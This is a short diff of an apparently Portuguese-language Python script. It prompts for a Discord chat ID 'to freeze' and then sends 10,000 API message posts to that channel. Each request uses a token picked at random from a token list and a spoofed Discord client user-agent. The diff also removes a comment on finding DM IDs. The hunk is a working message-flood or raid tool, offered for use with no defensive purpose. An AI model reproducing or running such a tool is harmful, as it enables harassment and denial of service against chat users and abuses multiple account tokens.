@@ -72,7 +72,7 @@ if str(canalchoice) == 's':
 
 elif str(canalchoice) == 'n':
     print(' ')
-    idcanal = str(input(" Insira o ID do chat que você deseja travar: ")) # pra pegar id de DM, tem que copiar o link de alguma mensagem e pegar o id depois do "@me/"
+    idcanal = str(input(" Insira o ID do chat que você deseja travar: "))
     for _ in range(10000):
         headers = {'Authorization':random.choice(tokens),'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.12 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'}
         r = requests.post(f'https://discord.com/api/v8/channels/{idcanal}/messages', headers=headers, json=payload)
